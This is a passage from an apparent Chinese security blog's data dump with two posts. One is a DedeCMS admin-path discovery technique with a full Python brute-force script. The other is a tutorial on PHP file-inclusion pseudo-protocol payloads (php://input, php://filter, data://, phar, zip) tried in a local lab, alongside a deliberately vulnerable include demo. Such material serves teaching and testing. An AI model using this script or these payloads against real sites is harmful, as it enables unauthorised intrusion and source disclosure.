&quot;https://www.site.com&quot;)&apos;)</span><br><span class=\"line\">    (options, args) = parser.parse_args()</span><br><span class=\"line\">    if options.url:</span><br><span class=\"line\">        #目标url</span><br><span class=\"line\">        url = options.url+&quot;/tags.php&quot;</span><br><span class=\"line\">        exec(url)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        parser.print_help()</span><br><span class=\"line\">if __name__ == &apos;__main__&apos;:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"DEDECMS查找后台目录\"><a href=\"#DEDECMS查找后台目录\" class=\"headerlink\" title=\"DEDECMS查找后台目录\"></a>DEDECMS查找后台目录</h1><h2 id=\"利用条件：\"><a href=\"#利用条件：\" class=\"headerlink\" title=\"利用条件：\"></a>利用条件：</h2><ul>\n<li><p>Windows系统 </p>\n<p>因为需要用到通配符<code>&lt;</code>(或<code>&gt;</code>)，来达到以下效果。</p>\n<p>建立两个php文件，5149ff33ebec0e6ad37613ea30694c07.php和demo.php</p>\n<p>内容如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#5149ff33ebec0e6ad37613ea30694c07.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\tphpinfo();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#demo.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t$filename = $_GET[<span class=\"string\">\"file\"</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">include</span> $filename.<span class=\"string\">\".php\"</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n</li>\n</ul>\n<p><img src=\"/img/dedecms/dedecms%E6%9F%A5%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95/001.png\" alt=\"001\"></p>\n<p>这里是利用到了windows的FindFirstFile(API),这个API把&lt;&lt;当成通配符来用。而PHP的opendir(win32\\readdir.c)就使用了该API。</p>\n<ul>\n<li><p>包含common.inc.php的php文件，如tags.php</p>\n</li>\n<li><p>后台中一张的图片名</p>\n</li>\n</ul>\n<h2 id=\"代码逻辑\"><a href=\"#代码逻辑\" class=\"headerlink\" title=\"代码逻辑\"></a>代码逻辑</h2><p>在common.inc.php的145行</p>\n<p><img src=\"/img/dedecms/dedecms%E6%9F%A5%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95/002.png\" alt=\"002\"></p>\n<p>uploadsafe.inc.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>( preg_match(<span class=\"string\">'#^(cfg_|GLOBALS)#'</span>, $_key) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">'Request var not allow for uploadsafe!'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $$_key = $_FILES[$_key][<span class=\"string\">'tmp_name'</span>];</span><br><span class=\"line\">    $&#123;$_key.<span class=\"string\">'_name'</span>&#125; = $_FILES[$_key][<span class=\"string\">'name'</span>];</span><br><span class=\"line\">    $&#123;$_key.<span class=\"string\">'_type'</span>&#125; = $_FILES[$_key][<span class=\"string\">'type'</span>] = preg_replace(<span class=\"string\">'#[^0-9a-z\\./]#i'</span>, <span class=\"string\">''</span>, $_FILES[$_key][<span class=\"string\">'type'</span>]);</span><br><span class=\"line\">    $&#123;$_key.<span class=\"string\">'_size'</span>&#125; = $_FILES[$_key][<span class=\"string\">'size'</span>] = preg_replace(<span class=\"string\">'#[^0-9]#'</span>,<span class=\"string\">''</span>,$_FILES[$_key][<span class=\"string\">'size'</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($&#123;$_key.<span class=\"string\">'_name'</span>&#125;) &amp;&amp; (preg_match(<span class=\"string\">\"#\\.(\"</span>.$cfg_not_allowall.<span class=\"string\">\")$#i\"</span>,$&#123;$_key.<span class=\"string\">'_name'</span>&#125;) || !preg_match(<span class=\"string\">\"#\\.#\"</span>, $&#123;$_key.<span class=\"string\">'_name'</span>&#125;)) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!defined(<span class=\"string\">'DEDEADMIN'</span>))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"string\">'Not Admin Upload filetype not allow !'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>($&#123;$_key.<span class=\"string\">'_size'</span>&#125;))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $&#123;$_key.<span class=\"string\">'_size'</span>&#125; = @filesize($$_key);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    $imtypes = <span class=\"keyword\">array</span></span><br><span class=\"line\">    (</span><br><span class=\"line\">        <span class=\"string\">\"image/pjpeg\"</span>, <span class=\"string\">\"image/jpeg\"</span>, <span class=\"string\">\"image/gif\"</span>, <span class=\"string\">\"image/png\"</span>, </span><br><span class=\"line\">        <span class=\"string\">\"image/xpng\"</span>, <span class=\"string\">\"image/wbmp\"</span>, <span class=\"string\">\"image/bmp\"</span></span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(in_array(strtolower(trim($&#123;$_key.<span class=\"string\">'_type'</span>&#125;)), $imtypes))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $image_dd = @getimagesize($$_key);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!is_array($image_dd))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"string\">'Upload filetype not allow !'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这一段中<font color=\"red\">$$_key</font>的<font color=\"red\">$key</font>取自<font color=\"red\">$_FILE</font>,是用户可控的,可以传入<font color=\"red\">_FILES[poc][tmp_name]=payload&lt;&lt;/images/adminico.gif&amp;_FILES[poc][name]=0&amp;_FILES[poc][size]=0&amp;_FILES[poc][type]=image/gif</font>来查找后台。payload处结合通配符可以节省遍历时间。</p>\n<p>结合脚本：</p>\n<p><img src=\"/img/dedecms/dedecms%E6%9F%A5%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95/003.png\" alt=\"003\"></p>\n<h2 id=\"脚本\"><a href=\"#脚本\" class=\"headerlink\" title=\"脚本\"></a>脚本</h2><p>拿红日的脚本改的</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\">#coding:utf-8</span><br><span class=\"line\">&apos;&apos;&apos;/*</span><br><span class=\"line\">    * env    = python3</span><br><span class=\"line\">    */</span><br><span class=\"line\">&apos;&apos;&apos;</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import itertools</span><br><span class=\"line\">from optparse import OptionParser</span><br><span class=\"line\">characters = &quot;abcdefghijklmnopqrstuvwxyz0123456789_!#&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">    &quot;_FILES[poc][tmp_name]&quot; : &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;,</span><br><span class=\"line\">    &quot;_FILES[poc][name]&quot; : 0,</span><br><span class=\"line\">    &quot;_FILES[poc][size]&quot; : 0,</span><br><span class=\"line\">    &quot;_FILES[poc][type]&quot; : &quot;image/gif&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">def exec(url):</span><br><span class=\"line\">    back_dir = &quot;&quot;</span><br><span class=\"line\">    flag = 0</span><br><span class=\"line\">    for num in range(1,7):</span><br><span class=\"line\">        if flag:</span><br><span class=\"line\">            break</span><br><span class=\"line\">        for pre in itertools.permutations(characters,num):</span><br><span class=\"line\">            pre = &apos;&apos;.join(list(pre))</span><br><span class=\"line\">            data[&quot;_FILES[poc][tmp_name]&quot;] = data[&quot;_FILES[poc][tmp_name]&quot;].format(p=pre)</span><br><span class=\"line\">            print(&quot;testing&quot;,pre)</span><br><span class=\"line\">            r = requests.post(url,data=data)</span><br><span class=\"line\">            if &quot;Upload filetype not allow !&quot; not in r.text and r.status_code == 200:</span><br><span class=\"line\">                flag = 1</span><br><span class=\"line\">                back_dir = pre</span><br><span class=\"line\">                data[&quot;_FILES[poc][tmp_name]&quot;] = &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span><br><span class=\"line\">                break</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                data[&quot;_FILES[poc][tmp_name]&quot;] = &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span><br><span class=\"line\">    print(&quot;[+] 前缀为：&quot;,back_dir)</span><br><span class=\"line\">    flag = 0</span><br><span class=\"line\">    for i in range(30):</span><br><span class=\"line\">        if flag:</span><br><span class=\"line\">            break</span><br><span class=\"line\">        for ch in characters:</span><br><span class=\"line\">            if ch == characters[-1]:</span><br><span class=\"line\">                flag = 1</span><br><span class=\"line\">                break</span><br><span class=\"line\">            data[&quot;_FILES[poc][tmp_name]&quot;] = data[&quot;_FILES[poc][tmp_name]&quot;].format(p=back_dir+ch)</span><br><span class=\"line\">            r = requests.post(url, data=data)</span><br><span class=\"line\">            if &quot;Upload filetype not allow !&quot; not in r.text and r.status_code == 200:</span><br><span class=\"line\">                back_dir += ch</span><br><span class=\"line\">                print(&quot;[+] &quot;,back_dir)</span><br><span class=\"line\">                data[&quot;_FILES[poc][tmp_name]&quot;] = &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span><br><span class=\"line\">                break</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                data[&quot;_FILES[poc][tmp_name]&quot;] = &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span><br><span class=\"line\">    print(&quot;后台地址为：&quot;,back_dir)</span><br><span class=\"line\"></span><br><span class=\"line\">def main():</span><br><span class=\"line\">    parser = OptionParser()</span><br><span class=\"line\">    parser.add_option(&apos;-u&apos;,&apos;--url&apos;,type=&apos;string&apos;,dest=&apos;url&apos;,help=&apos;Targer URL(e.g. &quot;https://www.site.com&quot;)&apos;)</span><br><span class=\"line\">    (options, args) = parser.parse_args()</span><br><span class=\"line\">    if options.url:</span><br><span class=\"line\">        #目标url</span><br><span class=\"line\">        url = options.url+&quot;/tags.php&quot;</span><br><span class=\"line\">        exec(url)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        parser.print_help()</span><br><span class=\"line\">if __name__ == &apos;__main__&apos;:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n"},{"title":"php 文件包含伪协议利用","date":"2019-01-03T07:34:47.000Z","_content":"\n# php 文件包含伪协议利用\n\n---\n\n## 重要配置\n\nPHP.ini：\n\nallow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。\n\nallow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等。\n\n## PHP 中的封装协议(伪协议)\n\n```\nhttp://cn2.php.net/manual/zh/wrappers.php\n\nfile:///var/www/html 访问本地文件系统\n\nftp://<login>:<password>@<ftpserveraddress> 访问 FTP(s) URLs\n\ndata:// 数据流\n\nhttp:// — 访问 HTTP(s) URLs\n\nftp:// — 访问 FTP(s) URLs\n\nphp:// — 访问各个输入/输出流\n\nzlib:// — 压缩流\n\ndata:// — Data (RFC 2397)\n\nglob:// — 查找匹配的文件路径模式\n\nphar:// — PHP Archive\n\nssh2:// — Secure Shell 2\n\nrar:// — RAR\n\nogg:// — Audio streams\n\nexpect:// — 处理交互式的流\n```\n\n## 利用file://协议\n\n利用条件：双off的情况下也可以正常使用\n\nfile:// [文件的绝对路径和文件名]\n\n```\nincludes.php?file=file://C:\\phpStudy\\PHPTutorial\\WWW\\upload-labs\\upload\\phpinfo.txt\n```\n\n![000](/img/FileContains/000.png)\n\n## 利用php流input\n\n*利用条件：*\n\n1、allow_url_include = On。\n\n2、对 allow_url_fopen 不做要求。\n\n>/includes.php?file=php://input\n>\n>POST：`<?php phpinfo();?>`\n\n![001](/img/FileContains/001.png)\n\n\n\n## 利用php流filter\n\n利用条件：双off的情况下也可以正常使用\n\n通过指定末尾的文件，可以读取经 base64 加密后的文件源码。（读取敏感文件）\n\n```php+HTML\n?file=php://filter/convert.base64-encode/resource=includes.php\n//includes.php是读取的文件\n```\n\n![002](/img/FileContains/002.png)\n\n![003](/img/FileContains/003.png)\n\n## 利用 data URIs\n\n*利用条件：*\n\n1、php 版本大于等于 php5.2\n\n2、allow_url_fopen = On\n\n3、allow_url_include = On\n\n```shell\nfile=data:text/plain,<?php phpinfo();?>\nfile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\n//%2b是+,需要使用url编码\n```\n\n![004](/img/FileContains/004.png)\n\n## 利用phar\n\n*利用条件：*\n\n1、php 版本大于等于 php5.3.0\n\n假设有个文件 phpinfo.txt，其内容为 `<?php phpinfo(); ?>`，打包成 zip 压缩包，如下：\n\n> 路径：test.zip/test/phpinfo.txt\n\n![004_1](/img/FileContains/004_1.png)\n\n> ```shell\n> # 相对路径\n> includes.php?file=phar://upload/test.zip/test/phpinfo.txt\n> \n> # 绝对路径\n> includes.php?file=phar://C:/phpStudy/PHPTutorial/WWW/upload-labs/upload/test.zip/test/phpinfo.txt\n> ```\n\n![005](/img/FileContains/005.png)\n\n![006](/img/FileContains/006.png)\n\n## 利用zip://, bzip2://, zlib://协议\n\n*利用条件：*\n\n1、zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用\n\nzip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件。\n\n### zip://协议\n\n**使用方法：**\n\nzip://archive.zip#dir/file.txt\n\nzip:// [压缩文件绝对路径]#[压缩文件内的子文件名]\n\n> 使用 zip 协议，需要指定绝对路径，同时将 `#` 编码为 `%23`，之后填上压缩包内的文件。\n\n```shell\n# 绝对路径\nincludes.php?file=zip://C:\\phpStudy\\PHPTutorial\\WWW\\upload-labs\\upload\\test.zip%23phpinfo.txt\n\n# 相对路径\nincludes.php?file=zip://upload/test.zip%23phpinfo.txt\n```\n\n![007](/img/FileContains/007.png)\n\n![008](/img/FileContains/008.png)\n\n### bzip2://协议\n\n**使用方法：**\n\ncompress.bzip2://file.bz2\n\n利用linux压缩命令\n\n```shell\n#bzip2 压缩\nbzip2 phpinfo\n#生成phpinfo.bz2,上传到目录\n```\n\n\n\n```\nincludes.php?file=compress.bzip2://./upload/phpinfo.bz2\n```\n![010](/img/FileContains/010.png)\n\n![011](/img/FileContains/011.png)\n\n### zlib://协议\n\n**使用方法：**\n\ncompress.zlib://file.gz\n\n```shell\n# 绝对路径\nincludes.php?file=compress.zlib://C:/phpStudy/PHPTutorial/WWW/upload-labs/upload/phpinfo.txt\n\n# 相对路径\nincludes.php?file=compress.zlib://./upload/phpinfo.txt\n```\n\n![012](/img/FileContains/012.png)\n\n![013](/img/FileContains/013.png)","source":"_posts/php 文件包含伪协议利用.md","raw":"---\ntitle: php 文件包含伪协议利用\ndate: 2019-01-03 15:34:47\ntags: [php,文件包含]\ncategories:\n  - [php]\n  - [整理]\n  - [文件包含]\n---\n\n# php 文件包含伪协议利用\n\n---\n\n## 重要配置\n\nPHP.ini：\n\nallow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。\n\nallow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等。\n\n## PHP 中的封装协议(伪协议)\n\n```\nhttp://cn2.php.net/manual/zh/wrappers.php\n\nfile:///var/www/html 访问本地文件系统\n\nftp://<login>:<password>@<ftpserveraddress> 访问 FTP(s) URLs\n\ndata:// 数据流\n\nhttp:// — 访问 HTTP(s) URLs\n\nftp:// — 访问 FTP(s) URLs\n\nphp:// — 访问各个输入/输出流\n\nzlib:// — 压缩流\n\ndata:// — Data (RFC 2397)\n\nglob:// — 查找匹配的文件路径模式\n\nphar:// — PHP Archive\n\nssh2:// — Secure Shell 2\n\nrar:// — RAR\n\nogg:// — Audio streams\n\nexpect:// — 处理交互式的流\n```\n\n## 利用file://协议\n\n利用条件：双off的情况下也可以正常使用\n\nfile:// [文件的绝对路径和文件名]\n\n```\nincludes.php?file=file://C:\\phpStudy\\PHPTutorial\\WWW\\upload-labs\\upload\\phpinfo.txt\n```\n\n![000](/img/FileContains/000.png)\n\n## 利用php流input\n\n*利用条件：*\n\n1、allow_url_include = On。\n\n2、对 allow_url_fopen 不做要求。\n\n>/includes.php?file=php://input\n>\n>POST：`<?php phpinfo();?>`\n\n![001](/img/FileContains/001.png)\n\n\n\n## 利用php流filter\n\n利用条件：双off的情况下也可以正常使用\n\n通过指定末尾的文件，可以读取经 base64 加密后的文件源码。（读取敏感文件）\n\n```php+HTML\n?file=php://filter/convert.base64-encode/resource=includes.php\n//includes.php是读取的文件\n```\n\n![002](/img/FileContains/002.png)\n\n![003](/img/FileContains/003.png)\n\n## 利用 data URIs\n\n*利用条件：*\n\n1、php 版本大于等于 php5.2\n\n2、allow_url_fopen = On\n\n3、allow_url_include = On\n\n```shell\nfile=data:text/plain,<?php phpinfo();?>\nfile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\n//%2b是+,需要使用url编码\n```\n\n![004](/img/FileContains/004.png)\n\n## 利用phar\n\n*利用条件：*\n\n1、php 版本大于等于 php5.3.0\n\n假设有个文件 phpinfo.txt，其内容为 `<?php phpinfo(); ?>`，打包成 zip 压缩包，如下：\n\n> 路径：test.zip/test/phpinfo.txt\n\n![004_1](/img/FileContains/004_1.png)\n\n> ```shell\n> # 相对路径\n> includes.php?file=phar://upload/test.zip/test/phpinfo.txt\n> \n> # 绝对路径\n> includes.php?file=phar://C:/phpStudy/PHPTutorial/WWW/upload-labs/upload/test.zip/test/phpinfo.txt\n> ```\n\n![005](/img/FileContains/005.png)\n\n![006](/img/FileContains/006.png)\n\n## 利用zip://, bzip2://, zlib://协议\n\n*利用条件：*\n\n1、zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用\n\nzip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件。\n\n### zip://协议\n\n**使用方法：**\n\nzip://archive.zip#dir/file.txt\n\nzip:// [压缩文件绝对路径]#[压缩文件内的子文件名]\n\n> 使用 zip 协议，需要指定绝对路径，同时将 `#` 编码为 `%23`，之后填上压缩包内的文件。\n\n```shell\n# 绝对路径\nincludes.php?file=zip://C:\\phpStudy\\PHPTutorial\\WWW\\upload-labs\\upload\\test.zip%23phpinfo.txt\n\n# 相对路径\nincludes.php?file=zip://upload/test.zip%23phpinfo.txt\n```\n\n![007](/img/FileContains/007.png)\n\n![008](/img/FileContains/008.png)\n\n### bzip2://协议\n\n**使用方法：**\n\ncompress.bzip2://file.bz2\n\n利用linux压缩命令\n\n```shell\n#bzip2 压缩\nbzip2 phpinfo\n#生成phpinfo.bz2,上传到目录\n```\n\n\n\n```\nincludes.php?file=compress.bzip2://./upload/phpinfo.bz2\n```\n![010](/img/FileContains/010.png)\n\n![011](/img/FileContains/011.png)\n\n### zlib://协议\n\n**使用方法：**\n\ncompress.zlib://file.gz\n\n```shell\n# 绝对路径\nincludes.php?file=compress.zlib://C:/phpStudy/PHPTutorial/WWW/upload-labs/upload/phpinfo.txt\n\n# 相对路径\nincludes.php?file=compress.zlib://./upload/phpinfo.txt\n```\n\n![012](/img/FileContains/012.png)\n\n![013](/img/FileContains/013.png)","slug":"php 文件包含伪协议利用","published":1,"updated":"2019-06-19T17:23:13.383Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istc800154dsb98jms8y8","content":"<h1 id=\"php-文件包含伪协议利用\"><a href=\"#php-文件包含伪协议利用\" class=\"headerlink\" title=\"php 文件包含伪协议利用\"></a>php 文件包含伪协议利用</h1><hr>\n<h2 id=\"重要配置\"><a href=\"#重要配置\" class=\"headerlink\" title=\"重要配置\"></a>重要配置</h2><p>PHP.ini：</p>\n<p>allow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。</p>\n<p>allow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等。</p>\n<h2 id=\"PHP-中的封装协议-伪协议\"><a href=\"#PHP-中的封装协议-伪协议\" class=\"headerlink\" title=\"PHP 中的封装协议(伪协议)\"></a>PHP 中的封装协议(伪协议)</h2><figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">http:</span><span class=\"comment\">//cn2.php.net/manual/zh/wrappers.php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">file:</span><span class=\"comment\">///var/www/html 访问本地文件系统</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">ftp:</span><span class=\"comment\">//&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt; 访问 FTP(s) URLs</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">data:</span><span class=\"comment\">// 数据流</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">http:</span><span class=\"comment\">// — 访问 HTTP(s) URLs</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">ftp:</span><span class=\"comment\">// — 访问 FTP(s) URLs</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">php:</span><span class=\"comment\">// — 访问各个输入/输出流</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">zlib:</span><span class=\"comment\">// — 压缩流</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">data:</span><span class=\"comment\">// — Data (RFC 2397)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">glob:</span><span class=\"comment\">// — 查找匹配的文件路径模式</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">phar:</span><span class=\"comment\">// — PHP Archive</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">ssh2:</span><span class=\"comment\">// — Secure Shell 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">rar:</span><span class=\"comment\">// — RAR</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">ogg:</span><span class=\"comment\">// — Audio streams</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">expect:</span><span class=\"comment\">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"利用file-协议\"><a href=\"#利用file-协议\" class=\"headerlink\" title=\"利用file://协议\"></a>利用file://协议</h2><p>利用条件：双off的情况下也可以正常使用</p>\n<p>file:// [文件的绝对路径和文件名]</p>\n<figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">includes.php?file=file://C:<span class=\"symbol\">\\p</span>hpStudy<span class=\"symbol\">\\P</span>HPTutorial<span class=\"symbol\">\\W</span>WW<span class=\"symbol\">\\u</span>pload-labs<span class=\"symbol\">\\u</span>pload<span class=\"symbol\">\\p</span>hpinfo.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/FileContains/000.png\" alt=\"000\"></p>\n<h2 id=\"利用php流input\"><a href=\"#利用php流input\" class=\"headerlink\" title=\"利用php流input\"></a>利用php流input</h2><p><em>利用条件：</em></p>\n<p>1、allow_url_include = On。</p>\n<p>2、对 allow_url_fopen 不做要求。</p>\n<blockquote>\n<p>/includes.php?file=php://input</p>\n<p>POST：<code>&lt;?php phpinfo();?&gt;</code></p>\n</blockquote>\n<p><img src=\"/img/FileContains/001.png\" alt=\"001\"></p>\n<h2 id=\"利用php流filter\"><a href=\"#利用php流filter\" class=\"headerlink\" title=\"利用php流filter\"></a>利用php流filter</h2><p>利用条件：双off的情况下也可以正常使用</p>\n<p>通过指定末尾的文件，可以读取经 base64 加密后的文件源码。（读取敏感文件）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/convert.base64-encode/resource=includes.php</span><br><span class=\"line\">//includes.php是读取的文件</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/FileContains/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/FileContains/003.png\" alt=\"003\"></p>\n<h2 id=\"利用-data-URIs\"><a href=\"#利用-data-URIs\" class=\"headerlink\" title=\"利用 data URIs\"></a>利用 data URIs</h2><p><em>利用条件：</em></p>\n<p>1、php 版本大于等于 php5.2</p>\n<p>2、allow_url_fopen = On</p>\n<p>3、allow_url_include = On</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br><span class=\"line\">file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br><span 